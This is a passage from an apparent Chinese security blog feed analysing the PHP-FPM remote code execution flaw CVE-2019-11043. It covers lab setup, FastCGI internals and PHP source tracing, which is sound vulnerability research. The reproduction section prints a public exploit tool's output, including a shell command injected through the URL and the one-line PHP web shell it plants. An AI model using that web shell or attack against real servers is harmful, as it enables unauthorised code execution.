        &lt;h2 id=&quot;为什么要学-Go？&quot;&gt;&lt;a href=&quot;#为什么要学-Go？&quot; class=&quot;headerlink&quot; title=&quot;为什么要学 Go？&quot;&gt;&lt;/a&gt;为什么要学 Go？&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;以下引用自左耳听风专栏。&lt;/p&gt;
&lt;/blockquote
      
    
    </summary>
    
    
      <category term="笔记" scheme="https://wywwzjj.top/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>PHP-FPM RCE (CVE-2019-11043)</title>
    <link href="https://wywwzjj.top/2020/01/23/PHP-FPM-RCE/"/>
    <id>https://wywwzjj.top/2020/01/23/PHP-FPM-RCE/</id>
    <published>2020-01-23T15:05:54.000Z</published>
    <updated>2020-03-22T10:11:48.069Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>安全研究员 Andrew Danau 在解决一道 CTF 题目时发现，向目标服务器 URL 发送 <code>%0a</code> 符号时，服务返回异常，疑似存在漏洞。当 Nginx 将包含 PATH_INFO 为空的参数通过 FastCGI 传递给 PHP-FPM 时，PHP-FPM 接收处理的过程中存在逻辑问题。通过精心构造恶意请求可以对 PHP-FPM 进行内存污染，进一步可以复写内存并修改 PHP-FPM 配置，实现远程代码执行。</p><p>官方补丁：<a href="https://github.com/php/php-src/commit/ab061f95ca966731b1c84cf5b7b20155c0a1c06a#diff-624bdd47ab6847d777e15327976a9227" target="_blank" rel="noopener">https://github.com/php/php-src/commit/ab061f95ca966731b1c84cf5b7b20155c0a1c06a#diff-624bdd47ab6847d777e15327976a9227</a></p><p><strong>影响版本</strong></p><p>PHP 7.1 版本小于 7.1.33</p><p>PHP 7.2 版本小于 7.2.24</p><p>PHP 7.3 版本小于 7.3.11</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>只想复现的直接用 p 师傅的 vulhub 启一下 docker，也可以 docker 里装 gdb 调。</p><p>文档链接：<a href="https://vulhub.org/#/environments/php/CVE-2019-11043/" target="_blank" rel="noopener">https://vulhub.org/#/environments/php/CVE-2019-11043/</a></p><h3 id="编译-PHP"><a href="#编译-PHP" class="headerlink" title="编译 PHP"></a>编译 PHP</h3><p>非必要扩展就不装了。make 之后，二进制文件在 sapi/fpm 下面。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://www.php.net/distributions/php-7.2.23.tar.gz</span><br><span class="line">tar -xvf php-7.2.23.tar.gz &amp;&amp; cd php-7.2.23</span><br><span class="line">./configure --enable-debug --enable-fpm</span><br><span class="line">make</span><br></pre></td></tr></table></figure><h3 id="配置-fpm"><a href="#配置-fpm" class="headerlink" title="配置 fpm"></a>配置 fpm</h3><p>进程管理方式 pm 选 static，并且 worker 进程设为 1，只产生一个进程便于追踪。日志就直接输出到屏幕。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[global]</span><br><span class="line">error_log = /proc/self/fd/2</span><br><span class="line">daemonize = no</span><br><span class="line">[www]</span><br><span class="line">access.log = /proc/self/fd/2</span><br><span class="line">clear_env = no</span><br><span class="line">listen = 127.0.0.1:9000</span><br><span class="line">pm = static</span><br><span class="line">pm.max_children = 1</span><br><span class="line">pm.start_servers = 1</span><br></pre></td></tr></table></figure><h3 id="配置-nginx"><a href="#配置-nginx" class="headerlink" title="配置 nginx"></a>配置 nginx</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>     <span class="number">80</span> default_server;</span><br><span class="line">    <span class="attribute">server_name</span>  _;</span><br><span class="line">    <span class="attribute">root</span> /var/www/html;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">index</span>  index.php index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> <span class="regexp">~ [^/]\.php(/|$)</span> &#123;</span><br><span class="line">        <span class="attribute">fastcgi_split_path_info</span><span class="regexp"> ^(.+?\.php)(/.*)$</span>;</span><br><span class="line">        <span class="attribute">include</span> fastcgi_params;</span><br><span class="line">        <span class="attribute">fastcgi_param</span> SCRIPT_FILENAME <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">        <span class="attribute">fastcgi_param</span> PATH_INFO       <span class="variable">$fastcgi_path_info</span>;</span><br><span class="line">        <span class="attribute">fastcgi_param</span> PATH_TRANSLATED <span class="variable">$document_root</span><span class="variable">$fastcgi_path_info</span>;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">fastcgi_pass</span>   <span class="number">127.0.0.1:9000</span>;</span><br><span class="line">        <span class="attribute">fastcgi_index</span>  index.php;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">error_page</span>   <span class="number">500</span> <span class="number">502</span> <span class="number">503</span> <span class="number">504</span>  /50x.html;</span><br><span class="line">    <span class="attribute">location</span> = /50x.html &#123;</span><br><span class="line">        <span class="attribute">root</span>   /usr/share/nginx/html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="启动-fpm"><a href="#启动-fpm" class="headerlink" title="启动 fpm"></a>启动 fpm</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./php-fpm -c php.ini -y php-fpm.conf</span><br></pre></td></tr></table></figure><h3 id="CLion-调试"><a href="#CLion-调试" class="headerlink" title="CLion 调试"></a>CLion 调试</h3><p>我这里用 CLion attach 调试了，<a href="https://www.jetbrains.com/help/clion/attaching-to-local-process.html" target="_blank" rel="noopener">配置教程</a>。Run =&gt; Attach to process。</p><p>如果出现 ptrace: Operation not permitted</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope</span><br></pre></td></tr></table></figure><p>或者直接 gdb（虽然 CLion 也是用的 gdb）</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ps -aux | grep "pool www" | awk 'NR==1&#123;print $2&#125;' | gdb -p</span><br></pre></td></tr></table></figure><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>使用 <a href="https://github.com/neex/phuip-fpizdam" target="_blank" rel="noopener">https://github.com/neex/phuip-fpizdam</a> 中给出的工具，发送数据包。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜ fpm-rce go run . http://localhost/index.php</span><br><span class="line">2020/01/23 03:04:17 Base status code is 200</span><br><span class="line">2020/01/23 03:04:18 Status code 404 for qsl=1850, adding as a candidate</span><br><span class="line">2020/01/23 03:04:18 The target is probably vulnerable. Possible QSLs: [1840 1845 1850]</span><br><span class="line">2020/01/23 03:04:18 Attack params found: --qsl 1845 --pisos 43 --skip-detect</span><br><span class="line">2020/01/23 03:04:18 Trying to set "session.auto_start=0"...</span><br><span class="line">2020/01/23 03:04:18 Detect() returned attack params: --qsl 1845 --pisos 43 --skip-detect &lt;-- REMEMBER THIS</span><br><span class="line">2020/01/23 03:04:18 Performing attack using php.ini settings...</span><br><span class="line">2020/01/23 03:04:18 Success! Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&amp;" to URLs</span><br><span class="line">2020/01/23 03:04:18 Trying to cleanup /tmp/a...</span><br><span class="line">2020/01/23 03:04:18 Done!</span><br><span class="line"></span><br><span class="line">➜ fpm-rce cat /tmp/a</span><br><span class="line">&lt;?php echo `$_GET[a]`;return;?&gt;</span><br></pre></td></tr></table></figure><h2 id="FPM-生命周期"><a href="#FPM-生命周期" class="headerlink" title="FPM 生命周期"></a>FPM 生命周期</h2><p>这一部分建议看<a href="https://github.com/pangudashu/php7-internal/blob/master/1/fpm.md" target="_blank" rel="noopener">盘谷大叔的书</a>，以下是部分摘录。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbjmb4q379j20he0d2wj1.jpg" alt="image.png"></p><p><code>fpm_run()</code> 执行后将 fork 出 worker 进程，worker 进程返回 <code>main()</code> 中继续向下执行，后面的流程就是 worker 进程不断 accept 请求，然后执行 PHP 脚本并返回。整体流程如下：</p><ul><li><strong>(1) 等待请求：</strong> worker 进程阻塞在 <code>fcgi_accept_request()</code> 等待请求；</li><li><strong>(2) 解析请求：</strong> fastcgi 请求到达后被 worker 接收，然后开始接收并解析请求数据，直到 request 数据完全到达；</li><li><strong>(3) 请求初始化：</strong> 执行 <code>php_request_startup()</code>，此阶段会调用每个扩展的：<code>PHP_RINIT_FUNCTION()</code>；</li><li><strong>(4) 编译、执行：</strong> 由 <code>php_execute_script()</code> 完成 PHP 脚本的编译、执行；</li><li><strong>(5) 关闭请求：</strong> 请求完成后执行 <code>php_request_shutdown()</code>，此阶段会调用每个扩展的：<code>PHP_RSHUTDOWN_FUNCTION()</code>，然后进入步骤 (1) 等待下一个请求。</li></ul><p>worker 进程一次请求的处理被划分为 5 个阶段：</p><ul><li><strong>FPM_REQUEST_ACCEPTING:</strong> 等待请求阶段</li><li><strong>FPM_REQUEST_READING_HEADERS:</strong> 读取 fastcgi 请求 header 阶段</li><li><strong>FPM_REQUEST_INFO:</strong> 获取请求信息阶段，此阶段是将请求的 method、query stirng、request uri 等信息保存到各 worker 进程的 fpm_scoreboard_proc_s 结构中，此操作需要加锁，因为 master 进程也会操作此结构</li><li><strong>FPM_REQUEST_EXECUTING:</strong> 执行请求阶段</li><li><strong>FPM_REQUEST_END:</strong> 没有使用</li><li><strong>FPM_REQUEST_FINISHED:</strong> 请求处理完成</li></ul><p>worker 处理到各个阶段时将会把当前阶段更新到 <code>fpm_scoreboard_proc_s-&gt;request_stage</code>，master 进程正是通过这个标识判断 worker 进程是否空闲的。FPM 进程管理有个记分牌机制。</p><h2 id="FastCGI-协议"><a href="#FastCGI-协议" class="headerlink" title="FastCGI 协议"></a>FastCGI 协议</h2><p>文档：<a href="http://www.mit.edu/~yandros/doc/specs/fcgi-spec.html" target="_blank" rel="noopener">http://www.mit.edu/~yandros/doc/specs/fcgi-spec.html</a></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbo2q5joroj21av0f7gpv.jpg" alt="image.png"></p><p><code>len = (contentLengthB1 &lt;&lt; 8) | contentLengthB0</code> 说明一次性最多发 2 ^ 16 = 256k。</p><h3 id="相关结构体"><a href="#相关结构体" class="headerlink" title="相关结构体"></a>相关结构体</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_header</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> version;<span class="comment">// 版本</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> type;<span class="comment">// 本次 record 的类型</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> requestIdB1;<span class="comment">// 本次 record 对应的请求 id</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> requestIdB0;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> contentLengthB1;<span class="comment">// body 的大小</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> contentLengthB0;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> paddingLength;<span class="comment">// 额外块大小</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> reserved;</span><br><span class="line">&#125; fcgi_header;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> _fcgi_request_type &#123;</span><br><span class="line">    FCGI_BEGIN_REQUEST=  <span class="number">1</span>, <span class="comment">/* [in]                              */</span></span><br><span class="line">    FCGI_ABORT_REQUEST=  <span class="number">2</span>, <span class="comment">/* [in]  (not supported)             */</span></span><br><span class="line">    FCGI_END_REQUEST=  <span class="number">3</span>, <span class="comment">/* [out]                             */</span></span><br><span class="line">    FCGI_PARAMS=  <span class="number">4</span>, <span class="comment">/* [in]  environment variables       */</span></span><br><span class="line">    FCGI_STDIN=  <span class="number">5</span>, <span class="comment">/* [in]  post data                   */</span></span><br><span class="line">    FCGI_STDOUT=  <span class="number">6</span>, <span class="comment">/* [out] response                    */</span></span><br><span class="line">    FCGI_STDERR=  <span class="number">7</span>, <span class="comment">/* [out] errors                      */</span></span><br><span class="line">    FCGI_DATA=  <span class="number">8</span>, <span class="comment">/* [in]  filter data (not supported) */</span></span><br><span class="line">    FCGI_GET_VALUES=  <span class="number">9</span>, <span class="comment">/* [in]                              */</span></span><br><span class="line">    FCGI_GET_VALUES_RESULT= <span class="number">10</span>  <span class="comment">/* [out]                             */</span></span><br><span class="line">&#125; fcgi_request_type;</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbk8k4lkzjj20e80exdl6.jpg" alt="image.png"></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbk8b6xunej20o90cidk2.jpg" alt="image.png"></p><h3 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h3><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbi62e4czfj20jl09a789.jpg" alt="image.png"></p><p>以下是向服务器发送 <code>index.php/abc%0aabc</code> 时抓的数据包，结合上面几张图就很容易看懂了。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000  01 01 00 01 00 08 00 00  00 01 00 00 00 00 00 00   ........ ........</span><br><span class="line">00000010  01 04 00 01 02 48 00 00  0c 00 51 55 45 52 59 5f   .....H.. ..QUERY_</span><br><span class="line">00000020  53 54 52 49 4e 47 0e 03  52 45 51 55 45 53 54 5f   STRING.. REQUEST_</span><br><span class="line">00000030  4d 45 54 48 4f 44 47 45  54 0c 00 43 4f 4e 54 45   METHODGE T..CONTE</span><br><span class="line">00000040  4e 54 5f 54 59 50 45 0e  00 43 4f 4e 54 45 4e 54   NT_TYPE. .CONTENT</span><br><span class="line">00000050  5f 4c 45 4e 47 54 48 0b  12 53 43 52 49 50 54 5f   _LENGTH. .SCRIPT_</span><br><span class="line">00000060  4e 41 4d 45 2f 69 6e 64  65 78 2e 70 68 70 2f 61   NAME/ind ex.php/a</span><br><span class="line">00000070  62 63 0a 61 62 63 0b 14  52 45 51 55 45 53 54 5f   bc.abc.. REQUEST_</span><br><span class="line">00000080  55 52 49 2f 69 6e 64 65  78 2e 70 68 70 2f 61 62   URI/inde x.php/ab</span><br><span class="line">00000090  63 25 30 61 61 62 63 0c  12 44 4f 43 55 4d 45 4e   c%0aabc. .DOCUMEN</span><br><span class="line">000000A0  54 5f 55 52 49 2f 69 6e  64 65 78 2e 70 68 70 2f   T_URI/in dex.php/</span><br><span class="line">000000B0  61 62 63 0a 61 62 63 0d  15 44 4f 43 55 4d 45 4e   abc.abc. .DOCUMEN</span><br><span class="line">000000C0  54 5f 52 4f 4f 54 2f 75  73 72 2f 73 68 61 72 65   T_ROOT/u sr/share</span><br><span class="line">000000D0  2f 6e 67 69 6e 78 2f 68  74 6d 6c 0f 08 53 45 52   /nginx/h tml..SER</span><br><span class="line">000000E0  56 45 52 5f 50 52 4f 54  4f 43 4f 4c 48 54 54 50   VER_PROT OCOLHTTP</span><br><span class="line">000000F0  2f 31 2e 31 0e 04 52 45  51 55 45 53 54 5f 53 43   /1.1..RE QUEST_SC</span><br><span class="line">00000100  48 45 4d 45 68 74 74 70  11 07 47 41 54 45 57 41   HEMEhttp ..GATEWA</span><br><span class="line">00000110  59 5f 49 4e 54 45 52 46  41 43 45 43 47 49 2f 31   Y_INTERF ACECGI/1</span><br><span class="line">00000120  2e 31 0f 0c 53 45 52 56  45 52 5f 53 4f 46 54 57   .1..SERV ER_SOFTW</span><br><span class="line">00000130  41 52 45 6e 67 69 6e 78  2f 31 2e 31 37 2e 38 0b   AREnginx /1.17.8.</span><br><span class="line">00000140  0a 52 45 4d 4f 54 45 5f  41 44 44 52 31 37 32 2e   .REMOTE_ ADDR172.</span><br><span class="line">00000150  32 35 2e 30 2e 31 0b 05  52 45 4d 4f 54 45 5f 50   25.0.1.. REMOTE_P</span><br><span class="line">00000160  4f 52 54 35 36 38 33 34  0b 0a 53 45 52 56 45 52   ORT56834 ..SERVER</span><br><span class="line">00000170  5f 41 44 44 52 31 37 32  2e 32 35 2e 30 2e 33 0b   _ADDR172 .25.0.3.</span><br><span class="line">00000180  02 53 45 52 56 45 52 5f  50 4f 52 54 38 30 0b 01   .SERVER_ PORT80..</span><br><span class="line">00000190  53 45 52 56 45 52 5f 4e  41 4d 45 5f 0f 03 52 45   SERVER_N AME_..RE</span><br><span class="line">000001A0  44 49 52 45 43 54 5f 53  54 41 54 55 53 32 30 30   DIRECT_S TATUS200</span><br><span class="line">000001B0  09 00 50 41 54 48 5f 49  4e 46 4f 0f 03 52 45 44   ..PATH_I NFO..RED</span><br><span class="line">000001C0  49 52 45 43 54 5f 53 54  41 54 55 53 32 30 30 0f   IRECT_ST ATUS200.</span><br><span class="line">000001D0  1f 53 43 52 49 50 54 5f  46 49 4c 45 4e 41 4d 45   .SCRIPT_ FILENAME</span><br><span class="line">000001E0  2f 76 61 72 2f 77 77 77  2f 68 74 6d 6c 2f 69 6e   /var/www /html/in</span><br><span class="line">000001F0  64 65 78 2e 70 68 70 2f  61 62 63 0a 61 62 63 0d   dex.php/ abc.abc.</span><br><span class="line">00000200  0d 44 4f 43 55 4d 45 4e  54 5f 52 4f 4f 54 2f 76   .DOCUMEN T_ROOT/v</span><br><span class="line">00000210  61 72 2f 77 77 77 2f 68  74 6d 6c 09 0e 48 54 54   ar/www/h tml..HTT</span><br><span class="line">00000220  50 5f 48 4f 53 54 6c 6f  63 61 6c 68 6f 73 74 3a   P_HOSTlo calhost:</span><br><span class="line">00000230  38 30 38 30 0f 0b 48 54  54 50 5f 55 53 45 52 5f   8080..HT TP_USER_</span><br><span class="line">00000240  41 47 45 4e 54 63 75 72  6c 2f 37 2e 35 38 2e 30   AGENTcur l/7.58.0</span><br><span class="line">00000250  0b 03 48 54 54 50 5f 41  43 43 45 50 54 2a 2f 2a   ..HTTP_A CCEPT*/*</span><br><span class="line">00000260  01 04 00 01 00 00 00 00  01 05 00 01 00 00 00 00   ........ ........</span><br><span class="line"></span><br><span class="line">00000000  01 06 00 01 00 44 04 00  58 2d 50 6f 77 65 72 65   .....D.. X-Powere</span><br><span class="line">00000010  64 2d 42 79 3a 20 50 48  50 2f 37 2e 32 2e 31 30   d-By: PH P/7.2.10</span><br><span class="line">00000020  0d 0a 43 6f 6e 74 65 6e  74 2d 74 79 70 65 3a 20   ..Conten t-type: </span><br><span class="line">00000030  74 65 78 74 2f 68 74 6d  6c 3b 20 63 68 61 72 73   text/htm l; chars</span><br><span class="line">00000040  65 74 3d 55 54 46 2d 38  0d 0a 0d 0a 54 48 5f 49   et=UTF-8 ....TH_I</span><br><span class="line">00000050  4e 46 4f 00 00 00 00 00  01 03 00 01 00 08 00 00   NFO..... ........</span><br><span class="line">00000060  00 00 00 00 00 08 00 00                            ........</span><br></pre></td></tr></table></figure><h3 id="FPM-如何将参数提取出来？"><a href="#FPM-如何将参数提取出来？" class="headerlink" title="FPM 如何将参数提取出来？"></a>FPM 如何将参数提取出来？</h3><p>结合 FPM 生命周期，解析 FastCGI 协议字段是在 FPM_REQUEST_READING_HEADERS 阶段。</p><blockquote><p>本来想把这些过程画一个函数调用图，太麻烦了。</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fpm_main.c</span></span><br><span class="line">request = fpm_init_request(fcgi_fd);</span><br><span class="line"></span><br><span class="line">zend_first_try &#123;</span><br><span class="line">    <span class="keyword">while</span> (EXPECTED(fcgi_accept_request(request) &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="keyword">char</span> *primary_script = <span class="literal">NULL</span>;</span><br><span class="line">        request_body_fd = <span class="number">-1</span>;</span><br><span class="line">        SG(server_context) = (<span class="keyword">void</span> *) request;</span><br><span class="line">        init_request_info();</span><br><span class="line"></span><br><span class="line">        fpm_request_info();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; zend_catch &#123;</span><br><span class="line">    exit_status = FPM_EXIT_SOFTWARE;</span><br><span class="line">&#125; zend_end_try();</span><br></pre></td></tr></table></figure><p><strong>fpm_accept_request</strong> 建立连接之后，就是读取数据。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fastcgi.c</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fcgi_accept_request</span><span class="params">(fcgi_request *req)</span> </span>&#123;</span><br><span class="line">    req-&gt;hook.on_accept();</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    req-&gt;fd = accept(listen_socket, (struct sockaddr *)&amp;sa, &amp;len);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    req-&gt;hook.on_read();</span><br><span class="line">    fcgi_read_request(req);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>fcgi_read_request</strong> 先读 header，获取到 type，再拿到 len，针对类型做不同处理，再继续往下读。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fastcgi.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">fcgi_read_request</span><span class="params">(fcgi_request *req)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> (safe_read(req, &amp;hdr, <span class="keyword">sizeof</span>(fcgi_header)) != <span class="keyword">sizeof</span>(fcgi_header) || </span><br><span class="line">        hdr.version &lt; FCGI_VERSION_1) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    len = (hdr.contentLengthB1 &lt;&lt; <span class="number">8</span>) | hdr.contentLengthB0;</span><br><span class="line">    padding = hdr.paddingLength;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (hdr.type == FCGI_PARAMS &amp;&amp; len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (len + padding &gt; FCGI_MAX_LENGTH) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">// safe_read() 是对 read() 的封装</span></span><br><span class="line">        <span class="keyword">if</span> (safe_read(req, buf, len+padding) != len+padding) &#123;</span><br><span class="line">            req-&gt;keep = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!fcgi_get_params(req, buf, buf+len)) &#123;</span><br><span class="line">            req-&gt;keep = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (safe_read(req, &amp;hdr, <span class="keyword">sizeof</span>(fcgi_header)) != <span class="keyword">sizeof</span>(fcgi_header) ||</span><br><span class="line">            hdr.version &lt; FCGI_VERSION_1) &#123;</span><br><span class="line">            req-&gt;keep = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        len = (hdr.contentLengthB1 &lt;&lt; <span class="number">8</span>) | hdr.contentLengthB0;</span><br><span class="line">        padding = hdr.paddingLength;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>fcgi_get_params</strong> 当 <code>hdr.type == FCGI_PARAMS</code> 就开始提取参数，全部存储到 <code>request-&gt;env-&gt;data</code>。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">fcgi_get_params</span><span class="params">(fcgi_request *req, <span class="keyword">unsigned</span> <span class="keyword">char</span> *p, <span class="keyword">unsigned</span> <span class="keyword">char</span> *end)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> name_len, val_len;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (p &lt; end) &#123;</span><br><span class="line">    name_len = *p++;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        </span><br><span class="line">    val_len = *p++;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    fcgi_hash_set(&amp;req-&gt;env, FCGI_HASH_FUNC(p, name_len), (<span class="keyword">char</span>*)p, name_len, (<span class="keyword">char</span>*)p + name_len, val_len);</span><br><span class="line">    p += name_len + val_len;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>提取实例</strong></p><p>提取规则很简单，Nginx 以 <code>keyLength+valueLength+key+value</code> 传过来的，利用 <code>fcgi_hash_set()</code> 存进去。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x7ffd6e941dde</span>:<span class="string">"\v\024REQUEST_URI/index.php/abc%0aabc\f\022DOCUMENT_URI/index.php/abc\nabc\r\rDOCUMENT_ROOT/var/www/html\017\bSERVER_PROTOCOLHTTP/1.1\016\004REQUEST_SCHEMEhttp\021\aGATEWAY_INTERFACECGI/1.1\017\fSERVER_SOFTWAREnginx/1.14.0\v\tREMOTE_ADDR127.0.0.1\v\005REMOTE_PORT37248\v\tSERVER_ADDR127.0.0.1\v\002SERVER_PORT80\v\001SERVER_NAME_\017\003REDIRECT_STATUS200\017\037SCRIPT_FILENAME/var/www/html/index.php/abc\nabc\t"</span></span><br><span class="line"><span class="number">0x7ffd6e941f40</span>:<span class="string">"PATH_INFO\017\rPATH_TRANSLATED/var/www/html\t\tHTTP_HOSTlocalhost\017\vHTTP_USER_AGENTcurl/7.58.0\v\003HTTP_ACCEPT*/*"</span></span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>看一下 nginx 文档推荐的 fpm 配置，其中特意判断了一下脚本文件是否存在。</p><p>注意：能被攻击的是没有这行判断的。</p><blockquote><p>配置字段不熟悉的可以看这个 <a href="http://nginx.org/en/docs/http/ngx_http_fastcgi_module.html" target="_blank" rel="noopener">http://nginx.org/en/docs/http/ngx_http_fastcgi_module.html</a></p></blockquote><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">location</span> <span class="regexp">~ [^/]\.php(/|$)</span> &#123;</span><br><span class="line">    <span class="attribute">fastcgi_split_path_info</span><span class="regexp"> ^(.+?\.php)(/.*)$</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="attribute">if</span> (!-f <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>) &#123;</span><br><span class="line">        <span class="attribute">return</span> <span class="number">404</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="attribute">fastcgi_pass</span> <span class="number">127.0.0.1:9000</span>;</span><br><span class="line">    <span class="attribute">fastcgi_index</span> index.php;</span><br><span class="line">    <span class="attribute">fastcgi_param</span> SCRIPT_FILENAME <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">    <span class="attribute">fastcgi_param</span> DOCUMENT_ROOT /var/www/html/;</span><br><span class="line">    <span class="attribute">include</span> fastcgi_params;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="异常出现"><a href="#异常出现" class="headerlink" title="异常出现"></a>异常出现</h3><p>在 URL 中加入换行符后出现了异常，我设的返回值是 $_SERVER[‘PATH_INFO’]​，看这结果应该是出现了溢出。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbi4wahg7qj20aw03nt8p.jpg" alt="image.png"></p><p>根据这个正则 <code>^(.+?\.php)(/.*)$</code>，前一部分给了 $fastcgi_script_name，后一部分给了 $fastcgi_path_info。</p><p>由于没有匹配换行符，FastCGI 拿到的 PATH_INFO 应该是空的。为什么 PHP 依然能获取到呢？</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php &gt; preg_match('/^(.+?\.php)(\/.*)$/', urldecode('index.php/abcabc'), $matches);print_r($matches);</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; index.php/abcabc</span><br><span class="line">    [1] =&gt; index.php</span><br><span class="line">    [2] =&gt; /abcabc</span><br><span class="line">)</span><br><span class="line">php &gt; preg_match('/^(.+?\.php)(\/.*)$/', urldecode('index.php/abc%0aabc'), $matches);print_r($matches);</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>为什么 fpm 拿到的 SCRIPT_NAME 为 <code>index.php/abc%0a/123</code>？正则匹配结果诡异，这一点得翻 nginx 源码了。</p><h3 id="找寻原因"><a href="#找寻原因" class="headerlink" title="找寻原因"></a>找寻原因</h3><p>继续寻找这些问题的答案。上面已经对 FastCGI 做了比较详细的描述，这里直奔主题。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fpm_main.c</span></span><br><span class="line">request = fpm_init_request(fcgi_fd);</span><br><span class="line"></span><br><span class="line">zend_first_try &#123;</span><br><span class="line">    <span class="keyword">while</span> (EXPECTED(fcgi_accept_request(request) &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="keyword">char</span> *primary_script = <span 